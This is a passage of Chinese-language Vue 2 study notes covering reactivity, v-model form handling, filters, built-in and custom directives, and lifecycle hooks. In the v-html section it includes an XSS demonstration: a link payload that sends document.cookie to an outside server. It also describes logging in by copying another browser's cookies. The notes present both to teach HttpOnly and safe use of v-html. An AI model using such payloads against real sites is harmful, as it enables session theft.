@click&#x3D;&quot;addGender&quot;&gt;添加性别，默认为男&lt;&#x2F;button&gt; &lt;button @click&#x3D;&quot;student.gender &#x3D; &#39;未知&#39;&quot;&gt;修改性别&lt;&#x2F;button&gt; &lt;h2&gt;爱好&lt;&#x2F;h2&gt; &lt;ul&gt; &lt;li v-for&#x3D;&quot;(h,index) in student.hobby&quot; :key&#x3D;&quot;index&quot;&gt;&#123;&#123;h&#125;&#125;&lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;button @click&#x3D;&quot;addHobby&quot;&gt;添加爱好&lt;&#x2F;button&gt; &lt;button @click&#x3D;&quot;updateHobby&quot;&gt;更新爱好&lt;&#x2F;button&gt; &lt;button @click&#x3D;&quot;removeHobby&quot;&gt;过滤爱好&lt;&#x2F;button&gt; &lt;ul&gt; &lt;li v-for&#x3D;&quot;f,index in student.friends&quot; :key&#x3D;&quot;index&quot;&gt;&#123;&#123;f.name&#125;&#125;------&#123;&#123;f.age&#125;&#125;&lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;button @click&#x3D;&quot;addFridens&quot;&gt;添加朋友&lt;&#x2F;button&gt; &lt;button @click&#x3D;&quot;updateFriends&quot;&gt;修改朋友&lt;&#x2F;button&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 const vm &#x3D; new Vue(&#123; el: &#39;#root&#39;, data: &#123; collage: &#39;UESTC&#39;, student: &#123; name: &#39;张加林&#39;, site: &#39;miketaylorjuly123.cn&#39;, age: 20, friends: [ &#123; name: &#39;jerry&#39;, age: 20 &#125;, &#123; name: &#39;mike&#39;, age: 21 &#125;, &#123; name: &#39;tony&#39;, age: 30 &#125; ], hobby:[&#39;打游戏&#39;,&#39;看番&#39;,&#39;睡觉&#39;] &#125; &#125;, methods: &#123; addGender() &#123; &#x2F;&#x2F; Vue.set(this.student,&#39;gender&#39;,&#39;男&#39;); this.$set(this.student, &#39;gender&#39;, &#39;男&#39;); &#125;, addFridens()&#123; this.student.friends.push(&#123;name:&#39;wzith&#39;,age:12&#125;) &#125;, updateFriends()&#123; this.student.friends[0].name &#x3D; &#39;张三&#39;; &#x2F;&#x2F;注意：这是对象，有setter和getter this.student.friends[0].age &#x3D; 13; &#125;, addHobby()&#123; this.student.hobby.push(&#39;吃甜品&#39;) &#125;, updateHobby()&#123; this.student.hobby.splice(0,1,&#39;看美剧&#39;) &#x2F;&#x2F; Vue.set(this.student.hobby,0,&#39;看美剧&#39;); &#125;, removeHobby()&#123; this.student.hobby &#x3D; this.student.hobby.filter((h)&#x3D;&gt;&#123; return h !&#x3D;&#x3D; &#39;打游戏&#39; &#125;) &#125; &#125; &#125;)&lt;&#x2F;script&gt; * Vue会监视data中所有层次的数据 * 如何监视对象中的数据？ * 通过setter实现监视，且要在new Vue时就传入要检测的数据 * 对象中后追加的属性，Vue默认不做响应式处理 * 如需要给后添加的属性做响应式，请使用如下API： * `Vue.set(target,propertyName/index,value)` 或 `vm.$set(target,propertyName/index,value)` * 如何监测数组中的数据？ * 通过包裹数据更新元素的方法实现，本质就是对数组进行更新 * 重新解析模板，进而更新页面 * 在Vue修改数组中的某个元素一定要使用如下方法： * 使用这些API： * `push()` * `pop()` * `shift()` * `unshift()` * `reverse()` * `sort()` * `splice()` * `Vue.set()` 或 `vm.$set()` * 特别注意：`Vue.set()`和`vm.$set()不能给vm或vm的根数据对象添加数据 ##### 数据劫持 ![image-20210903165954197](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903165954197.png) 数据劫持和数据代理的原理都是Object.defineProperty()方法。 ### 1.24 收集表单数据 ##### 表单案例 v-model默认收集输入框的value值。 * 多选框 不给标签配置value，那么默认收集的是标签的checked值（选中与否 ,true / false），而v-model是双向绑定，hobby变为true后，其他多选框的checked变为true。 给多选框绑定value后，问题仍然无法解决。 因为hobby的初始值可以影响着v-model收集回来的数据，换成数组即可(`hobby:[]`) 注意：点击提交后，会引起表单提交，默认会跳转页面，可以绑定一个点击事件，阻止默认行为(`prevent`)，或： * 收集数据后的传输： * (不推荐) 1&#123;&quot;account&quot;:&quot;111&quot;,&quot;password&quot;:&quot;&quot;,&quot;gender&quot;:&quot;female&quot;,&quot;hobby&quot;:[&quot;game&quot;],&quot;city&quot;:&quot;ShenZhen&quot;,&quot;other&quot;:&quot;111&quot;,&quot;agree&quot;:true&#125; * 推荐： ##### 完整代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;form @submit.prevent&#x3D;&quot;demo&quot;&gt; &lt;h2&gt;输入框&lt;&#x2F;h2&gt; &lt;label for&#x3D;&quot;account&quot;&gt;账号：&lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;account&quot; v-model&#x3D;&quot;userInfo.account&quot;&gt;&lt;&#x2F;label&gt;&lt;br &#x2F;&gt; &lt;label for&#x3D;&quot;password&quot;&gt;密码：&lt;input type&#x3D;&quot;password&quot; id&#x3D;&quot;password&quot; v-model&#x3D;&quot;userInfo.password&quot;&gt;&lt;&#x2F;label&gt;&lt;br &#x2F;&gt; 年龄：&lt;input type&#x3D;&quot;text&quot; v-model.number&#x3D;&quot;userInfo.age&quot;&gt; &lt;h2&gt;单选框&lt;&#x2F;h2&gt; 性别： &lt;!-- radio要求亲自配置value --&gt; 男&lt;input type&#x3D;&quot;radio&quot; name&#x3D;&quot;gender&quot; v-model&#x3D;&quot;userInfo.gender&quot; value&#x3D;&quot;male&quot;&gt; 女&lt;input type&#x3D;&quot;radio&quot; name&#x3D;&quot;gender&quot; v-model&#x3D;&quot;userInfo.gender&quot; value&#x3D;&quot;female&quot;&gt;&lt;br &#x2F;&gt; &lt;h2&gt;多选框&lt;&#x2F;h2&gt; 爱好： 学习&lt;input type&#x3D;&quot;checkbox&quot; v-model&#x3D;&quot;userInfo.hobby&quot; value&#x3D;&quot;study&quot;&gt; 打游戏&lt;input type&#x3D;&quot;checkbox&quot; v-model&#x3D;&quot;userInfo.hobby&quot; value&#x3D;&quot;game&quot;&gt; 吃甜品&lt;input type&#x3D;&quot;checkbox&quot; v-model&#x3D;&quot;userInfo.hobby&quot; value&#x3D;&quot;sweet&quot;&gt; &lt;br &#x2F;&gt; &lt;h2&gt;下拉框&lt;&#x2F;h2&gt; 所属校区： &lt;select v-model&#x3D;&quot;userInfo.city&quot;&gt; &lt;option value&#x3D;&quot;&quot;&gt;请选择校区&lt;&#x2F;option&gt; &lt;option value&#x3D;&quot;BeiJing&quot;&gt;北京&lt;&#x2F;option&gt; &lt;option value&#x3D;&quot;ShangHai&quot;&gt;上海&lt;&#x2F;option&gt; &lt;option value&#x3D;&quot;ShenZhen&quot;&gt;深圳&lt;&#x2F;option&gt; &lt;option value&#x3D;&quot;GuangZhou&quot;&gt;广州&lt;&#x2F;option&gt; &lt;br &#x2F;&gt;&lt;br &#x2F;&gt; &lt;&#x2F;select&gt; &lt;h2&gt;其他信息&lt;&#x2F;h2&gt; &lt;textarea v-model.lazy&#x3D;&quot;userInfo.other&quot;&gt;&lt;&#x2F;textarea&gt; &lt;br &#x2F;&gt; &lt;input type&#x3D;&quot;checkbox&quot; v-model&#x3D;&quot;userInfo.agree&quot;&gt; 阅读并接受&lt;a href&#x3D;&quot;miketaylorjuly123.cn&quot;&gt;《用户协议》&lt;&#x2F;a&gt; &lt;br &#x2F;&gt; &lt;button&gt;提交&lt;&#x2F;button&gt; &lt;&#x2F;form&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 new Vue(&#123; el: &#39;#root&#39;, data: &#123; userInfo: &#123; account: &#39;&#39;, password: &#39;&#39;, gender: &#39;female&#39;, &#x2F;&#x2F; 默认选female hobby: [], city: &#39;BeiJing&#39;, other: &#39;&#39;, agree: &#39;&#39;, age: &#39;&#39; &#125; &#125;, methods: &#123; demo() &#123; console.log(this.userInfo) &#x2F;&#x2F; console.log(JSON.stringify(this._data)) &#125; &#125; &#125;)&lt;&#x2F;script&gt; ##### v-model的修饰符 ###### number 优化： type限定只接受数字输入，其他类型输入会被屏蔽，但是收集的数据仍然是字符串格式，而v-model的修饰符，强制将收集的数据类型转换为数值型。 只使用v-model的修饰符只能起到部分作用，当首字符是数字，收集连续的数字为数值型数据，当出现非数字后，屏蔽后续输入；当首字符不是数字，收集所有输入为字符串。 ###### lazy 用于不希望敏感实时收集数据的情况，比如防抖，当表单节点失去焦点时，才会收集数据。 ###### trim 去掉首尾空格，和Js中的trim()效果一样 ##### 总结 * 收集表单数据： * 若：``，则v-model收集的是value的值，用户输入即为value值 * 若：``，则v-model收集的是value的值，且要给标签配置value值 * 若：`` * 没有配置input的value属性： * v-model的初始值是非数组，那么收集的就是checked（勾选或未勾选，是boolean值） * 配置了input的value属性： * v-model的初始值是数组，那么收集的就是checked（勾选或未勾选，是boolean值） * v-model的初始值是数组，那么收集的就是value组成的数组 * 备注：v-model的三个修饰符： * lazy：失去焦点后再收集数据 * trim：输入首尾空格过滤 * number：输入字符转为有效的数字 ### 1.25 过滤器 *非必须工具* 需求：显示格式化时间 #### day.js [BootCDN](https://www.bootcdn.cn/)：第三方库大全 ![image-20210903202719446](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903202719446.png) ![image-20210903202750253](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210903202750253.png) 123456789101112131415161718192021&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;h2&gt;显示格式化后的时间&lt;&#x2F;h2&gt; &lt;h3&gt;现在是：&#123;&#123;fmtTime&#125;&#125;&lt;&#x2F;h3&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;script&gt; Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 new Vue(&#123; el: &#39;#root&#39;, data: &#123; time: 1630671767228, &#x2F;&#x2F;时间戳 &#125;, computed: &#123; fmtTime() &#123; return dayjs(this.time).format(&#39;YYYY-MM-DD HH:mm:ss&#39;); &#x2F;&#x2F;给参数格式化参数时间，不给参数默认格式化当前时间 &#125; &#125; &#125;)&lt;&#x2F;script&gt; #### 案例实现 `|`：管道符 即使timeFormater不加`()`，过滤器也会把time作为参数，传递给timeFormater，而timeFormater的返回值会替换time成为实际值。 如果加了括号传参，如：`&#123;&#123;time | timeFormater('YYYY_MM_DD')&#125;&#125;，表面上传了一个参数，但实际上，传递了两个，第一个参数一定是前面的time！！！而第二个参数才是括号中的内容。 多个过滤器可以实现串联，过滤是按管道书写顺序来的。 局部过滤器：只有当前Vue实例能够使用，如果再出现一个Vue实例，就不能够使用了，即：如果vmA创建过滤器demoA，vmB创建过滤器demoB，则只能vmA用demoA，vmB用demoB。（以后一个vm，多个组件） 注意： 过滤器不但能用在插值语法中，还能用于数据绑定时的过滤： 但是只能用于v-bind，不能用于v-model 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;!--引入VUE--&gt; &lt;script src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;../js/dayjs.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id=&quot;root&quot;&gt; &lt;h2&gt;显示格式化后的时间&lt;/h2&gt; &lt;!-- 计算属性实现 --&gt; &lt;h3&gt;现在是：&#123;&#123;fmtTime&#125;&#125;&lt;/h3&gt;&lt;br/&gt; &lt;!-- methods实现 --&gt; &lt;h3&gt;&#123;&#123;getFmtTime()&#125;&#125;&lt;/h3&gt;&lt;br/&gt; &lt;!-- 过滤器实现 --&gt; &lt;h3 :x=&quot;name | myslice&quot;&gt;现在是：&#123;&#123;time | timeFormater | myslice&#125;&#125;&lt;/h3&gt; &lt;/div&gt;&lt;/body&gt;&lt;script&gt; Vue.config.productionTip = false;// 阻止VUE启动时生成生产提示。 // 配置全局过滤器 Vue.filter(&#x27;myslice&#x27;,function(value)&#123; return value.slice(0,4); &#125;) new Vue(&#123; el: &#x27;#root&#x27;, data: &#123; time: 1630671767228, //时间戳 name:&#x27;张加林&amp;&amp;&amp;zl&#x27;, &#125;, computed: &#123; fmtTime() &#123; return dayjs(this.time).format(&#x27;YYYY-MM-DD HH:mm:ss&#x27;); //给参数格式化参数时间，不给参数默认格式化当前时间 &#125; &#125;, methods:&#123; getFmtTime()&#123; return dayjs(this.time).format(&#x27;YYYY-MM-DD HH:mm:ss&#x27;); &#125; &#125;, filters:&#123; // 局部过滤器 timeFormater(value,str = &#x27;YYYY-MM-DD HH:mm:ss&#x27;)&#123; // ES6形参默认值 return dayjs(value).format(str); &#125;, // myslice(value)&#123; // return value.splice(0,4); // &#125; &#125; &#125;)&lt;/script&gt;&lt;/html&gt; 总结 过滤器： 语法：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑处理） 语法： 注册过滤器：Vue.filter(name,callback) 或 new Vue(filters:&#123;&#125;) 使用过滤器：&#123;&#123;xxx | 过滤器名&#125;&#125;或·v-bind:属性 = &quot;xxx | 过滤器名&quot; 备注： 过滤器也可以接收额外的参数，多个过滤器可以串联 并没有改变原来的数据，是产生新的对应的数据 1.26 Vue内置指令v-text作用：向其所在节点中渲染文本内容。 与插值语法的区别： v-text会拿到v-text中的变量值，然后替换整个节点中的值，而插值语法不会。 更加常用的是插值语法，因为它灵活。 v-text不能解析标签，而是将所有字符当做正常文本解析，不会当作标签结果： 123456&lt;h2 v-text &#x3D; &quot;test&quot;&gt;&lt;&#x2F;h2&gt;……………………data:&#123; site:&#39;miketaylorjuly123.cn&#39;, test: &#39;&lt;h3&gt;张加林&lt;&#x2F;h3&gt;&#39;&#125; v-htmlv-html支持结构解析，而v-text不支持。 cookie 登录网易邮箱为例： 换一个浏览器，将Cookie要登录的页面的cookie全部删除，替换为已经登录的浏览器的Cookie中的key value，你就可以成功登录页面！ 使用上述插件可以一键导入导出cookie。 安全问题js获取cookie 1234567891011121314151617181920&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;h2&gt;&#123;&#123;site&#125;&#125;&lt;&#x2F;h2&gt; &lt;h2 v-text &#x3D; &quot;test&quot;&gt;&lt;&#x2F;h2&gt; &lt;h2 v-html &#x3D; &quot;test&quot;&gt;&lt;&#x2F;h2&gt; &lt;div v-html&#x3D;&quot;str&quot;&gt;&lt;&#x2F;div&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt; &lt;script&gt; Vue.config.productionTip &#x3D; false ;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 new Vue(&#123; el:&#39;#root&#39;, data:&#123; site:&#39;miketaylorjuly123.cn&#39;, test: &#39;&lt;h3&gt;张加林&lt;&#x2F;h3&gt;&#39;, str:&#39;&lt;a href&#x3D;javascript:location.href &#x3D; &quot;http:&#x2F;&#x2F;www.baidu.com?&quot;+document.cookie&gt;我找的你想康的了，快来康康！！！&lt;&#x2F;a&gt;&#39; &#125; &#125;) &lt;&#x2F;script&gt; 点击后，获取当前正在所处网站的全部cookie，然后跳走，并且把所有的cookie以参数的形式传给坏人的服务器。 设置HttpOnly，使得cookie的该字段只能由HTTP协议可以读取，可以携带（js代码无法再直接读取cookie），所以敏感数据最好加HttpOnly限制。 总结 v-html 作用：向指定节点渲染包含html结构的内容 与插值语法的区别： v-html会替换掉节点中所有的内容，而不会这样 v-html可以识别html结构 特别要注意：v-html有安全性问题！！！ 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击（跨站脚本攻击（XSS），是最普遍的Web应用安全漏洞，能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。） 一定要在信任的内容上使用v-html，永远不要用在用户提交的内容上！！！ v-cloakWin + R =&gt; cmd =&gt; node server启动 访问链接：https://localhost:8080/resource/5s/vue.js 5s代表5s后返回vue.js给访问方。 虽然下述方式可以调节网速，但是无法控制外部的js返回时间。 js阻塞：JS具有阻塞特性，当浏览器在执行js代码时，不能同时做其它事情，即每次出现都会让页面等待脚本的解析和执行（不论JS是内嵌的还是外链的），JS代码执行完成后，才继续渲染页面。 下图效果：页面先显示&#123;&#123;site&#125;&#125;；5s后显示miketaylorhuly123.cn，页面内容较多时，就会出现页面闪现抖动。 解决该问题的方法：v-cloak 12345678910111213141516171819202122232425262728&lt;head&gt; &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt; &lt;title&gt;&lt;&#x2F;title&gt; &lt;!--引入VUE--&gt; &lt;style&gt; [v-cloak]&#123; &#x2F;* 选中所有标签中，有v-cloak属性的元素 *&#x2F; display: none; &#125; &lt;&#x2F;style&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;h2 v-cloak&gt;&#123;&#123;site&#125;&#125;&lt;&#x2F;h2&gt; &lt;&#x2F;div&gt; &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;https:&#x2F;&#x2F;localhost:8080&#x2F;resource&#x2F;5s&#x2F;vue.js&quot;&gt;&lt;&#x2F;script&gt; &lt;&#x2F;body&gt; &lt;script&gt; console.log(1); Vue.config.productionTip &#x3D; false ;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 new Vue(&#123; el:&#39;#root&#39;, data:&#123; site:&#39;miketaylorjuly123.cn&#39; &#125; &#125;) &lt;&#x2F;script&gt; 并结： v-cloak指令（没有值）： 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删除v-cloak属性 使用css配合v-cloak可以解决网速慢时页面展示出&#123;&#123;xxx&#125;&#125;的问题 v-once 1234567891011121314151617&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;h2 v-once&gt;初始化n值：&#123;&#123;n&#125;&#125;&lt;&#x2F;h2&gt; &lt;h2&gt;当前n值是：&#123;&#123;n&#125;&#125;&lt;&#x2F;h2&gt; &lt;button @click&#x3D;&quot;n++&quot;&gt;点击n++&lt;&#x2F;button&gt; &lt;&#x2F;div&gt; &lt;&#x2F;body&gt; &lt;script&gt; Vue.config.productionTip &#x3D; false ;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 new Vue(&#123; el:&#39;#root&#39;, data:&#123; n:1, &#125; &#125;) &lt;&#x2F;script&gt; 总结： v-once指令： v-once所在节点在初次动态渲染后，就视为静态内容了。 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。 注意区分v-once和once事件修饰符 v-pre1234567891011121314151617&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id&#x3D;&quot;root&quot;&gt; &lt;h2 v-pre&gt;Vue其实很简单&lt;&#x2F;h2&gt; &lt;h2 v-pre&gt;当前n值是：&#123;&#123;n&#125;&#125;&lt;&#x2F;h2&gt; &lt;button @click&#x3D;&quot;n++&quot; v-pre&gt;点击n++&lt;&#x2F;button&gt; &lt;&#x2F;div&gt; &lt;&#x2F;body&gt; &lt;script&gt; Vue.config.productionTip &#x3D; false ;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。 new Vue(&#123; el:&#39;#root&#39;, data:&#123; n:1, &#125; &#125;) &lt;&#x2F;script&gt; 总结： v-pre指令： 跳过其所在节点的编译过程 可以利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译 1.27 Vue自定义指令需求自定义指令需要自己操作DOM编写指令 需求一：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍（函数式实现） 需求二：定义一个v-bind指令，和v-bind功能类似，但是可以让其所绑定的input元素默认获取焦点（只能对象式实现，函数式实现不了） 函数式缺点是不能处理一些细节上的问题。 注意：b的value是值；这里的span标签是真实的DOM元素；定义时name，使用时v-big 证明： 方法一： 1console.dir(a); 方法二： 1console.log(a instanceof HTMLElement); //true instanceof用于判断a是不是HTML元素实例。 实现需求一 12345678910111213141516171819202122&lt;body&gt; &lt;div id=&quot;root&quot;&gt; &lt;h2&gt;当前的n值是：&lt;span v-text=&quot;n&quot;&gt;&lt;/span&gt;&lt;/h2&gt; &lt;h2&gt;放大10倍后的值是：&lt;span v-big=&quot;n&quot;&gt;&lt;/span&gt;&lt;/h2&gt; &lt;button @click=&quot;n++&quot;&gt;点我n++&lt;/button&gt; &lt;/div&gt;&lt;/body&gt;&lt;script&gt; Vue.config.productionTip = false;// 阻止VUE启动时生成生产提示。 new Vue(&#123; el: &#x27;#root&#x27;, data: &#123; n: 1, &#125;, directives: &#123; // big:function()&#123; big(element,binding) &#123; element.innerHTML = binding.value * 10; &#125; &#125; &#125;)&lt;/script&gt; big函数何时会被调用？ 指令与元素成功绑定的时候（一上来） 指令所在的模板被重新解析时（这里是n发生了变化，导致重新解析模板一定不是指令用到的数据发生更新时！！！） data数据发生变化时，重新解析一次，然后再解析的时候解析了v-big 对象式错误分析 这里不要取巧使用autofocus，因为它不是在所有的浏览器中都适用。 效果：开始没有获取焦点，点击后获取焦点。 &lt;body&gt; &lt;button id =&quot;btn&quot;&gt;点我创建一个输入框&lt;/button&gt; &lt;script type=&quot;text/javascript&quot;&gt; const btn = document.getElementById(&quot;btn&quot;) btn.onclick = ()=&gt;&#123; const input = document.createElement(&#39;input&#39;) document.body.appendChild(input) input.focus() &#125; &lt;/script&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879 上述代码效果：点击后创建了`input`框，并且获取了焦点 * &lt;img src=&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914000243753.png&quot; alt=&quot;image-20210914000243753&quot; style=&quot;zoom:80%;&quot; /&gt; 点击创建后，`input`框出现，但是没有默认获取焦点，因为还没有将创建的节点添加到`body`中，未添加到页面的节点不能这样！！！因为此时`parentElement`值为`null` * 类似需要放在节点创建添加之后的指令： &lt;img src=&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914001543338.png&quot; alt=&quot;image-20210914001543338&quot; style=&quot;zoom:80%;&quot; /&gt; 创建`input`框后，将其背景色变为`#8080ff` * 但是，并不是所有对创建但未添加的节点的操作都是无效的！ &lt;img src=&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914001305605.png&quot; alt=&quot;image-20210914001305605&quot; style=&quot;zoom:80%;&quot; /&gt; 创建的节点后，显示的结果背景为`#8080ff` * 解答：指令与元素成功绑定时（一上来），`big`函数会被调用，绑定成功了仅仅代表在内存里建立了绑定关系，此时节点还没加载到页面上，所以`focus()`调用无效；当点击`button`后，`n`发生改变，导致VUE重新系解析模板。##### 实现需求二* Vue会在特殊的时刻调用不同的函数： * `bind`：当指令与元素成功绑定的时候调用 * `inserted`：指令所在元素被插入页面时调用 * `update`：指令所在模板被重新解析时调用​ &lt;img src=&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914011109605.png&quot; alt=&quot;image-20210914011109605&quot; style=&quot;zoom:80%;&quot; /&gt;简写方式相当于只写了`bind`和`update`。#### 注意事项* 指令名 &lt;img src=&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914010536377.png&quot; alt=&quot;image-20210914010536377&quot; style=&quot;zoom:80%;&quot; /&gt; &lt;img src=&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914011159825.png&quot; alt=&quot;image-20210914011159825&quot; style=&quot;zoom:80%;&quot; /&gt; 原因：定义时的大写字母会被变为小写字母！！！ * &lt;img src=&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914011550066.png&quot; alt=&quot;image-20210914011550066&quot; style=&quot;zoom:80%;&quot; /&gt; ![image-20210914011615662](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914011615662.png) * 建议写法： &lt;img src=&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914011733885.png&quot; alt=&quot;image-20210914011733885&quot; style=&quot;zoom:80%;&quot; /&gt;* 回调函数`this`问题 &lt;img src=&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914012110450.png&quot; alt=&quot;image-20210914012110450&quot; style=&quot;zoom:80%;&quot; /&gt; &lt;img src=&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914012503843.png&quot; alt=&quot;image-20210914012503843&quot; style=&quot;zoom:80%;&quot; /&gt; 因为所有指令相关回调中的`this`都不是`vm`* 局部指令与全局指令 前面都是局部指令，下面定义全局指令： * 对象式： ```js Vue.directive(&#x27;fbind&#x27;,&#123; bind(element, binding) &#123; console.log(&#x27;bind&#x27;,this) element.value = binding.value &#125;, inserted(element, binding) &#123; element.focus() console.log(&#x27;inserted&#x27;,this) &#125;, update(element, binding) &#123; element.value = binding.value console.log(&#x27;update&#x27;,this) &#125; &#125;) 函数式： 123Vue.directive(&#x27;big&#x27;,function(element, binding) &#123; element.innerHTML = binding.value * 10; &#125;) 总结 定义语法： 局部指令： 123new Vue(&#123; directives:&#123;指令名:配置对象&#125;&#125;) 或 123new Vue(&#123; directives:&#123;函数名()&#123;&#125;&#125;&#125;) 全局指令： 1Vue.directive&#123;指令名,配置对象&#125; 或 1Vue.directive&#123;指令名,回调函数&#125; 配置对象常见的3个回调 bind：当指令与元素成功绑定的时候调用 inserted：指令所在元素被插入页面时调用 update：指令所在模板被重新解析时调用 备注 指令定义时不加v-，但是使用时要加v- 指令名如果是多个单词，要使用kebab-case命名方式，不要使用驼峰命名法 1.28 Vue生命周期引入生命周期1&lt;h2 :style=&quot;&#123;opacity : opacity&#125;&quot;&gt;miketaylorjuly123.cn&lt;/h2&gt; 在这里，对象的属性名和数据名相同，可以使用对象的简写形式： 1&lt;h2 :style=&quot;&#123;opacity&#125;&quot;&gt;miketaylorjuly123.cn&lt;/h2&gt; 出现的问题： 因为JS中小数计算不精确，例如0.1 + 0.2 ！= 0.3 所以可能直接越过等于0的情况，导致opacity无法重置。 这样虽然实现了功能，但是不够完美，因为处理逻辑在Vue外，而且中间变量vm占用内存，因此不推荐。 12345678910111213141516171819202122232425&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id=&quot;root&quot;&gt; &lt;h2 :style=&quot;&#123;opacity&#125;&quot;&gt;miketaylorjuly123.cn&lt;/h2&gt; &#123;&#123;change()&#125;&#125; &lt;/div&gt;&lt;/body&gt;&lt;script&gt; Vue.config.productionTip = false;// 阻止VUE启动时生成生产提示。 const vm = new Vue(&#123; el: &#x27;#root&#x27;, data: &#123; opacity: 1 &#125;, methods: &#123; change() &#123; setInterval(() =&gt; &#123; console.log(&#x27;开启了定时器&#x27;) if (this.opacity &lt;= 0) this.opacity = 1 this.opacity -= 0.01 &#125;, 10) &#125; &#125; &#125;)&lt;/script&gt; 产生这种效果的原因：opacity发生变化，Vue重新解析模板，然后导致change()被调用，而且还是指数式爆炸增长。 mounted：vue完成模板的解析，并把初始真实的DOM元素放入页面后，调用mounted()，即挂载完毕，只会被调用一次（后面的叫更新） 123456789101112131415161718192021&lt;body&gt; &lt;!--准备一个容器--&gt; &lt;div id=&quot;root&quot;&gt; &lt;h2 :style=&quot;&#123;opacity&#125;&quot;&gt;miketaylorjuly123.cn&lt;/h2&gt; &lt;/div&gt;&lt;/body&gt;&lt;script&gt; Vue.config.productionTip = false;// 阻止VUE启动时生成生产提示。 const vm = new Vue(&#123; el: &#x27;#root&#x27;, data: &#123; opacity: 1 &#125;, mounted () &#123; setInterval( () =&gt; &#123; if (this.opacity &lt;= 0) this.opacity = 1 this.opacity -= 0.01 &#125;, 10) &#125; &#125;)&lt;/script&gt; 注意：mounted函数的this是vm mounted函数只是Vue生命周期函数中的一个 生命周期 又名：生命周期回调函数、生命周期函数、生命周期钩子 是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的 生命周期函数中的this指向是vm或组件实例对象 生命周期图示 创建流程学会使用debugger;卡断点 123456beforeCreate()&#123; console.log(&#x27;beforeCreate&#x27;); console.log(this) console.log(this.n); debugger; &#125; 数据代理没有开始，vm上看不到_data和定义的函数 可以访问定义的函数和_data 挂载流程 编译el的外部HTML作为模板。 外部HTML理解： 红色框部分是模板，证明： Vue已经解析了模板，生成了虚拟DOM，但是页面呈现的仍然是未经Vue编译的DOM 创建vm.$el（虚拟DOM转为真实DOM后的备份），然后用它替换掉整个el 注意：此时所有对DOM的操作，最终strong>都是不奏效的！！！ 原因：得到虚拟DOM后，往vm.$el复制一份后，随后转为真实DOM插入页面，所以在beforeMount中操作DOM最终会被覆盖，是无效的。 此时： 页面中呈现的是经过Vue编译的DOM。 对DOM的操作均有效(尽可能避免)至此初始化过程结束，一 般在此进行： 开启定时器、发送网络请求、订阅消息、绑定自定义事件、等初始化操作。 没有el配置项，或者没有vm.$mount，就会停在created处。 证明：删除上述配置后，有： template模板用法 或 第二种方法可以Enter回车换行，而第一种不行(用&#39;和用`` `的区别) 问题1： 模板编译失败，因为：直接使用template配置项，只能有一个根节点！！！ 问题2： 原来的#root消失了，因为整个template中的内容i将div#root中的内容完全替换掉了(outHTML) 问题3： 不要企图将template作为组件root 